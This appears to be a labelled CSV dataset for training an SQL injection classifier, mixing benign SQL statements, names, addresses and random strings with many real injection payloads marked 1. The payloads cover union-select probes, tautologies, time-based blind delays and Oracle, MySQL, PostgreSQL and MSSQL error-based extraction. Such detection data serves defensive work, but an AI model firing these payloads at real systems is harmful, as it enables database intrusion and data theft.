Sentence,Label
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262312 )  ORDER BY meta_id ASC",0
SELECT steam ( s )  FROM useful UNION ALL,0
"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",1
1'  )   where 2852  =  2852,1
39202408n,0
"1%""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%""  =  """,1
"pl. ingeniero torres quevedo, s/n 7?a",0
juventino,0
select   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  select 9299 from master..sysdatabases  )   end  )  --,1
SELECT TOP 50 PERCENT * FROM act,0
SELECT COUNT ( tightID ) FROM noted,0
"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",1
6310,0
FROM  ( SELECT DISTINCT girl FROM discuss ) ,0
"1'||  (  select 'ftey' where 1363  =  1363 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
SELECT * FROM easy 3 SELECT * FROM look,0
7497,0
SELECT AVG ( brother ) FROM each SELECT SUM ( sheet ) ,0
10459,0
SELECT MIN ( market )  AS powerful FROM cover,0
SELECT COUNT ( memory ) FROM organization,0
abondadamente,0
"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb",1
SELECT * FROM should WHERE box  BETWEEN 10 AND 20,0
SELECT club ( s )  FROM drawn SELECT roar ( s ) ,0
"   SELECT COUNT ( donkey ) , before FROM parallel BY of",0
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1
1  )   where 7552  =  7552 order by 1#,1
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'nlfl' like 'nlfl",1
" select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1
igea,0
"-9871""  )   union all select 9082#",1
p870en538r7,0
3644620000000000,0
"  UPDATE steady SET palace =  'exercise', City =  'trick' WHERE cast =  probably",0
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1
SELECT * FROM kitchen,0
"1  )   as svkf where 6503  =  6503 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
5e011llo,0
9665,0
tsoucas,0
1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
SELECT Count ( * )  AS reach,0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",1
SELECT AVG ( unusual ) FROM drink SELECT SUM ( guess ) ,0
1 where 3027  =  3027 and 4595  =  4595#,1
brana@housemovie.id,0
"1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090",1
or 1  =  1 /*,1
SELECT * FROM  ( SELECT doubt FROM detail ) ,0
SELECT * FROM stream WHERE aware NOT LIKE '[wrapped]%',0
6028280000000000,0
1  )   where 6150  =  6150,1
SELECT * FROM cake  WHERE major = party,0
SELECT line ( s ) FROM dot INNER JOIN,0
2910120000000000,0
SELECT Count ( * )  AS drive,0
"   SELECT thy, think, paint FROM cast WHERE top  IS NULL",0
SELECT * FROM symbol WHERE Price NOT BETWEEN 10 AND 20,0
8693,0
"-2667  )   union all select 5848,5848,5848,5848--",1
43232451h,0
8ienne2s6,0
SELECT COUNT ( boneID ) FROM blank,0
SELECT * FROM eleven  WHERE tried = labor,0
SELECT * FROM board WHERE    NOT arrow = 'mind',0
"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"  SELECT rateID AS ID, avoid AS recall FROM rice",0
"SELECT YEAR ( ""2017-06-15 09:34:21"" ) ;",0
3372,0
tacuara,0
SELECT TOP 3 * FROM chart WHERE moment = 'house' SELECT * FROM nearly,0
"-5073""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""kbab"" like ""kbab",1
serrtil,0
1  )   as odqn where 3910  =  3910,1
1'+  (  select 'kicv' where 1976  =  1976 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1
-1393'   )    )     )   union all select 8280--,1
"-5616""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""hdrb"" like ""hdrb",1
SELECT AVG ( begun ) FROM band SELECT SUM ( chosen ) ,0
seymour@evelin.gn,0
"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",1
"1%""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,1
"-4044%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1
52943030c,0
or 1  =  1 or ''  =  ',1
SELECT DISTINCT friend FROM create,0
"1'  )   where 3330  =  3330 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT COUNT ( officer ) FROM suddenly,0
SELECT * FROM double WHERE    NOT wheel = 'knew',0
DELETE FROM somebody WHERE organized = 'respect',0
-3867%'  )   or 3084  =  5633 and   (  '%'  =  ',1
SELECT * FROM invented WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM seed WHERE section = 'build' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( test ) FROM look SELECT SUM ( free ) ,0
bevis,0
bertolda,0
" SELECT * FROM art ORDER BY carried, herself",0
"  SELECT * FROM bite WHERE weigh NOT IN  ( 'drive', 'avoid', 'free' )  ",0
SELECT * FROM though WHERE explain NOT LIKE 'ought%',0
"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",1
SELECT * FROM halfway WHERE NOT spell = 'vote'  AND NOT straight = 'ship',0
SELECT AVG ( lying ) FROM be,0
SELECT * FROM central WHERE lesson LIKE '%am%',0
"-4408""  )   or 6872  =  6872 and   (  ""oenu""  =  ""oenu",1
"1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1""  )   where 4951  =  4951",1
"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",1
"-2071 union all select 4753,4753--",1
gates,0
SELECT * FROM arrangement WHERE port = 'grandfather' FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 50 PERCENT * FROM popular,0
norean,0
SELECT AVG ( mental ) FROM thick,0
FROM  ( SELECT DISTINCT sum FROM science ) ,0
s3borrea,0
-1252'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'pzxh' like 'pzxh,1
"1%""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """,1
fitness,0
hermida fiordalizzi,0
"1 union all select null,null,null,null,null,null,null,null#",1
1  )   where 3381  =  3381 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
1%' order by 1#,1
SELECT COUNT ( relationship )  FROM value,0
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",1
netty9,0
"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
laruffa,0
"SELECT * FROM having WHERE planning BETWEEN ""avoid"" AND    ""lot""",0
SELECT although ( s )  FROM diagram UNION,0
SELECT complex ( s )  FROM blow UNION,0
"-6442""   )    )     )   or 3038  =  3038",1
nonaspe,0
"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1
SELECT * FROM hit WHERE brick NOT LIKE '[similar]%',0
"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr",1
57317186j,0
"1'   )    )    as eleh where 1347  =  1347 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,1
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'dsok'  =  'dsok",1
marlet esparraguera,0
1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,1
chanampa coromino,0
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
SELECT knew FROM basket UNION ALL SELECT impossible FROM heading ORDER BY announced,0
"1%'  )   union all select null,null,null,null,null,null,null,null,null#",1
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,1
"1""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
ibarra,0
DELETE FROM lead WHERE thus = 'trouble',0
vicens,0
1'+  (  select hvsb where 3666  =  3666,1
"1%' union all select null,null,null,null,null,null,null--",1
SELECT COUNT ( DISTINCT flight )  FROM neighbor,0
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-7939""  )   or 3958  =  6909",1
"SELECT column1 , column2, ... FROM table_name WHERE condition1 OR condition2 OR condition3 ... ;",0
1'   )    )    as jtmf where 3937  =  3937,1
SELECT * FROM labor ORDER BY slide,0
4916,0
SELECT AVG ( task ) FROM evening SELECT SUM ( heart ) ,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",1
bocana$da,0
SELECT naturally FROM found,0
"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1
SELECT * FROM solve,0
SELECT AVG ( spent ) FROM vapor,0
espa7t4ro,0
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  3332  =  3332,1
"   SELECT COUNT ( whispered ) , immediately FROM word BY thousand",0
"1  )   union all select null,null,null,null,null,null--",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""%""  =  """,1
-3634%'   )    )    or 2671  =  2434,1
SELECT AVG ( cookies ) FROM branch SELECT SUM ( property ) ,0
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""%""  =  """,1
"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",1
"  UPDATE money SET biggest =  'section', City =  'fair' WHERE won =  model",0
SELECT AVG ( number ) FROM draw SELECT SUM ( sound ) ,0
"1  )   where 5073  =  5073 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
7016,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 187 )  ORDER BY meta_id ASC",0
"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",1
"1'||  (  select 'aoad' where 8795  =  8795 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1
"1  )   where 7978  =  7978 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
6716280000000000,0
65472744r,0
" end and    (    (   ""dmgj""  =  ""dmgj",1
SELECT * FROM individual 3 SELECT * FROM gradually,0
3.5822E+015,0
1%'   )    )    waitfor delay '0:0:5'--,1
"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
br8c99ma4290,0
tiedeman,0
alhama de granada,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""%""  =  """,1
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""ppml""  =  ""ppml",1
SELECT valuable ( s )  FROM sport,0
"calle tampa 108, 7-g",0
"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
SELECT * FROM adjective WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM member WHERE final NOT LIKE '[indicate]%',0
gwohsing,0
-1641' union all select 4835#,1
1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
SELECT path ( s )  FROM handsome SELECT chapter ( s ) ,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  ",1
SELECT TOP 3 * FROM moon,0
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",1
menospreciativo,0
"-5313""   )    )     )   union all select 9189,9189,9189,9189,9189,9189,9189,9189--",1
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  '%'  =  ',1
"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--",1
or 'something'   =   'some'+'thing',1
"INSERT INTO slowly  ( sight, tree, feature )  VALUES  ( 'farmer', 'means', 'but' )  ",0
-9553   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   5299  =  5299,1
SELECT AVG ( done )  FROM ordinary  SELECT SUM ( closely ) ,0
"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu",1
SELECT printed ( s )  FROM verb FULL OUTER JOIN,0
-6567'   )    )    union all select 3217#,1
1002170000000000,0
"-3443""   )    )    union all select 4043,4043,4043,4043,4043,4043,4043#",1
SELECT TOP 3 * FROM full,0
"cami sant cugat al papiol 59,",0
SELECT * FROM glad 3 SELECT * FROM all,0
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1
colls messegu,0
07077546d,0
" end and    (    (     (  ""revx""  =  ""revx",1
"SELECT * FROM union WHERE either BETWEEN ""information"" AND    ""pine""",0
frechette8@legami.ly,0
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,1
SELECT * FROM children WHERE active = 'quiet' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM sport WHERE fighting = 'dropped' LIMIT 3,0
"   SELECT jet, city+ ', ' + soil+ ' ' + growth+ ', ' + entire AS wrote  FROM play",0
SELECT TOP 50 PERCENT * FROM basket SELECT * FROM record FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM youth,0
"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1
SELECT nuts ( s ) FROM else INNER JOIN,0
brazzel1@castigadas.am,0
"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT MIN ( right )  AS different FROM factor,0
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1
-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,1
SELECT * FROM fly FETCH FIRST 3 ROWS ONLY,0
-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
SELECT COUNT ( typicalID ) FROM average,0
"1""  )   where 6311  =  6311",1
2595,0
